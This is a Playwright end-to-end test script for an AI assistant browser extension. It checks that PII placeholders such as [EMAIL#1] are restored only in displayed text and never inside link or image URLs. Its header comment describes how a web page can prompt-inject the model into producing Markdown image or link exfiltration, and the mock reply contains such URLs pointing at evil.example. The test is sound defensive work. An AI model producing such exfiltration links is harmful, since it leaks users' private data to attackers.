// scripts/e2e-pii-render.mjs
//
// Real-browser check for S-03 (and the S-03(b) image placeholder): the privacy
// filter's placeholders ([EMAIL#1]) may be turned back into the user's real
// values in TEXT, but never inside a link target or image URL.
//
// A page can talk the model into answering
//     ![x](https://evil.example/collect?d=[EMAIL#1])
// Before the fix the worker restored the placeholder while streaming, before
// Markdown was parsed, so the rendered image/link address carried the user's
// real e-mail address. Now the reply keeps its placeholders and the side panel
// restores values in text nodes only.
//
// Needs Playwright with Chromium and openssl:   node scripts/e2e-pii-render.mjs
// Optional argument: another extension folder (used to run this same test
// against the original package as a control).
//
// How it works: a local HTTPS server impersonates api.deepseek.com (Chromium is
// started with --host-resolver-rules and --ignore-certificate-errors, and the
// server uses a throw-away self-signed certificate). The extension is loaded
// unpacked, a real question is sent from the side panel page, and the server
// streams SSE chunks slowly. The server records whether the CLIENT closed the
// connection before the stream was finished - which is exactly what "Stop"
// is supposed to cause and, before the fix, did not.

import os from "node:os";
import fs from "node:fs";
import path from "node:path";
import https from "node:https";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const { chromium } = require("playwright");

const extDir = process.argv[2] ? path.resolve(process.argv[2]) : path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ai-assistant-e2e-"));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function waitFor(fn, what, timeoutMs = 15000) {
  const t0 = Date.now();
  for (;;) {
    const v = await fn();
    if (v) return v;
    if (Date.now() - t0 > timeoutMs) throw new Error(`timed out waiting for ${what}`);
    await sleep(40);
  }
}

// ---- fake provider ----------------------------------------------------------
execFileSync("openssl", [
  "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1",
  "-keyout", path.join(tmp, "key.pem"), "-out", path.join(tmp, "cert.pem"),
  "-subj", "/CN=api.deepseek.com", "-addext", "subjectAltName=DNS:api.deepseek.com",
], { stdio: "ignore" });

// `reply` (when set) is streamed instead of the numbered chunks, split by line.
const provider = { chunks: 8, intervalMs: 40, prefix: "w", reply: null, requests: [] };
const server = https.createServer(
  { key: fs.readFileSync(path.join(tmp, "key.pem")), cert: fs.readFileSync(path.join(tmp, "cert.pem")) },
  (req, res) => {
    const rec = { written: 0, total: provider.chunks, finished: false, closedByClientAt: null, startedAt: Date.now(), body: null };
    provider.requests.push(rec);
    res.on("close", () => { if (!rec.finished) rec.closedByClientAt = Date.now(); });
    let raw = "";
    req.on("data", (c) => { raw += c; });
    req.on("end", () => {
      try { rec.body = JSON.parse(raw); } catch { rec.body = null; }
      res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
      const { chunks, intervalMs, prefix, reply } = provider;
      const pieces = reply ? reply.split(/(?<=\n)/) : null;
      const total = pieces ? pieces.length : chunks;
      rec.total = total;
      const tick = () => {
        if (res.destroyed || res.writableEnded) return;
        if (rec.written >= total) {
          res.write(`data: ${JSON.stringify({ choices: [{ delta: {}, finish_reason: "stop" }] })}\n\ndata: [DONE]\n\n`);
          rec.finished = true;
          res.end();
          return;
        }
        const content = pieces ? pieces[rec.written] : `${prefix}${rec.written} `;
        res.write(`data: ${JSON.stringify({ choices: [{ delta: { content } }] })}\n\n`);
        rec.written++;
        setTimeout(tick, intervalMs);
      };
      tick();
    });
  },
);
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const port = server.address().port;

const context = await chromium.launchPersistentContext(path.join(tmp, "profile"), {
  channel: "chromium",
  headless: true,
  args: [
    `--disable-extensions-except=${extDir}`,
    `--load-extension=${extDir}`,
    `--host-resolver-rules=MAP api.deepseek.com 127.0.0.1:${port}`,
    "--ignore-certificate-errors",
    // Chromium on Linux honours HTTPS_PROXY from the environment; this test only
    // talks to the loopback server above, so it must not go through any proxy.
    "--no-proxy-server",
  ],
});

const results = [];
async function test(name, fn) {
  try {
    await fn();
    results.push(true);
    console.log(`PASS  ${name}`);
  } catch (err) {
    results.push(false);
    console.log(`FAIL  ${name}\n      ${String(err?.message || err).split("\n").join("\n      ")}`);
  }
}

try {
  let worker = context.serviceWorkers()[0];
  worker ??= await context.waitForEvent("serviceworker", { timeout: 20000 });
  const extId = new URL(worker.url()).host;
  await worker.evaluate(() => chrome.storage.local.set({ apiKey: "test-key", includeCurrentPageContext: false }));

  const page = await context.newPage();
  const pageErrors = [];
  page.on("pageerror", (e) => pageErrors.push(String(e)));
  await page.goto(`chrome-extension://${extId}/sidepanel/sidepanel.html`);
  await page.waitForSelector("#chatForm");
  await page.waitForFunction(() => !document.getElementById("sendBtn").disabled, null, { timeout: 15000 });
  const sendEnabled = () => page.evaluate(() => !document.getElementById("sendBtn").disabled);

  const EMAIL = "alice.private@corp.example";
  const REPLY = [
    "Write to [EMAIL#1] today.\n",
    "\n",
    "![chart](https://evil.example/collect?d=[EMAIL#1])\n",
    "\n",
    "[click here](https://evil.example/c?d=[EMAIL#1])\n",
    "\n",
    "Also **[EMAIL#1]** in bold and `[EMAIL#1]` in code.\n",
  ].join("");
  Object.assign(provider, { intervalMs: 5, reply: REPLY, requests: [] });

  // Everything in the chat log that is an address: no real value may be in any of them.
  const addressAttributes = () => page.evaluate(() => {
    const out = [];
    for (const el of document.querySelectorAll("#chatLog *")) {
      for (const name of ["href", "src", "data-src", "title"]) {
        const v = el.getAttribute(name);
        if (v) out.push({ tag: el.tagName, name, value: v });
      }
    }
    return out;
  });
  const lastAssistant = () => page.evaluate(() => {
    const el = [...document.querySelectorAll(".bubble.assistant .bubble-text")].pop();
    return el ? { text: el.textContent, html: el.innerHTML } : null;
  });

  async function checkRendered(label) {
    const a = await lastAssistant();
    assert.ok(a, `${label}: no assistant bubble`);
    assert.ok(a.text.includes(`Write to ${EMAIL} today.`), `${label}: the real address is not shown in the text: ${JSON.stringify(a.text)}`);
    assert.ok(a.text.includes(`Also ${EMAIL} in bold and ${EMAIL} in code.`), `${label}: the real address is not shown in bold / code text: ${JSON.stringify(a.text)}`);
    const addresses = await addressAttributes();
    assert.ok(addresses.length >= 2, `${label}: expected an image placeholder and a link, got ${JSON.stringify(addresses)}`);
    for (const attr of addresses) {
      assert.ok(!attr.value.includes(EMAIL) && !attr.value.includes(encodeURIComponent(EMAIL)),
        `${label}: <${attr.tag} ${attr.name}> carries the real address: ${attr.value}`);
    }
    const link = addresses.find((x) => x.tag === "A" && x.name === "href");
    assert.ok(link && link.value.includes("[EMAIL"), `${label}: the link target should keep its placeholder, got ${link?.value}`);
    const box = addresses.find((x) => x.name === "data-src");
    assert.ok(box && box.value.includes("[EMAIL"), `${label}: the image address should keep its placeholder, got ${box?.value}`);
  }

  await test("S-03: real values show in text, but link targets and image addresses keep their placeholders", async () => {
    await page.fill("#questionInput", `My email is ${EMAIL}, please show the chart`);
    await page.click("#sendBtn");
    await waitFor(async () => (await lastAssistant())?.text?.includes("in code"), "the reply to render");
    await waitFor(sendEnabled, "the composer to unlock");
    // The privacy filter itself is unchanged: the provider never saw the address.
    assert.ok(!JSON.stringify(provider.requests[0].body).includes(EMAIL), "the provider received the real address");
    await checkRendered("live reply");
  });

  await test("S-03(b): the image placeholder names the host and warns about the query string", async () => {
    const box = await page.evaluate(() => {
      const el = document.querySelector(".remote-image");
      return el ? { text: el.textContent, hasQuery: el.classList.contains("has-query") } : null;
    });
    assert.ok(box, "no image placeholder");
    assert.ok(box.text.includes("evil.example"), `the host is not shown: ${box.text}`);
    assert.ok(box.hasQuery && box.text.includes("⚠️"), `no warning for an address with a query: ${box.text}`);
  });

  await test("S-03(b): an image outside the vetted hosts is announced as not loadable, with a plain link", async () => {
    const box = await page.evaluate(() => {
      const el = document.querySelector(".remote-image");
      const link = el?.querySelector("a");
      return el ? {
        untrusted: el.classList.contains("untrusted"),
        role: el.getAttribute("role"),
        tabindex: el.getAttribute("tabindex"),
        linkHref: link?.getAttribute("href") || "",
        linkTarget: link?.getAttribute("target") || "",
      } : null;
    });
    assert.ok(box, "no image placeholder");
    assert.ok(box.untrusted, "an address outside the vetted hosts should be marked untrusted");
    assert.ok(box.role === null && box.tabindex === null, `an untrusted placeholder is not a button: ${JSON.stringify(box)}`);
    assert.ok(box.linkHref.includes("evil.example") && box.linkTarget === "_blank", `no plain link to the address: ${JSON.stringify(box)}`);
    assert.ok(!box.linkHref.includes(EMAIL), "the link kept the real address");
  });

  await test("S-03: the saved reply keeps placeholders (+ its map) and renders the same after a reload", async () => {
    const saved = await worker.evaluate(async () => (await chrome.storage.local.get("conversationHistory")).conversationHistory);
    const assistant = saved?.[0]?.messages?.find((m) => m.role === "assistant");
    assert.ok(assistant.content.includes("[EMAIL#1]") && !assistant.content.includes(EMAIL), "the stored reply should be in placeholder form");
    assert.equal(assistant.piiMap?.["[EMAIL#1]"], EMAIL, "the stored reply should carry the map it needs");
    await page.reload();
    await page.waitForSelector("#chatForm");
    await page.waitForFunction(() => !document.getElementById("sendBtn").disabled, null, { timeout: 15000 });
    await page.selectOption("#historySelect", { index: 1 }).catch(() => {});
    await waitFor(async () => (await lastAssistant())?.text?.includes("in code"), "the saved conversation to render");
    await checkRendered("reloaded conversation");
  });

  await test("S-03: a follow-up sends the earlier reply to the provider redacted, never with the real address", async () => {
    provider.requests.length = 0;
    Object.assign(provider, { reply: "ok.\n" });
    await page.fill("#questionInput", "and now?");
    await page.click("#sendBtn");
    await waitFor(() => provider.requests.length > 0 && provider.requests[0].finished, "the follow-up request");
    const body = JSON.stringify(provider.requests[0].body);
    assert.ok(!body.includes(EMAIL), "the real address reached the provider in the follow-up");
    assert.ok(body.includes("[EMAIL#"), "the earlier turns should carry placeholders");
  });

  assert.deepEqual(pageErrors, [], `uncaught errors in the page: ${pageErrors.join(" | ")}`);
} finally {
  await context.close();
  server.close();
  fs.rmSync(tmp, { recursive: true, force: true });
}

console.log(`\n${results.filter(Boolean).length}/${results.length} passed`);
process.exit(results.every(Boolean) ? 0 : 1);
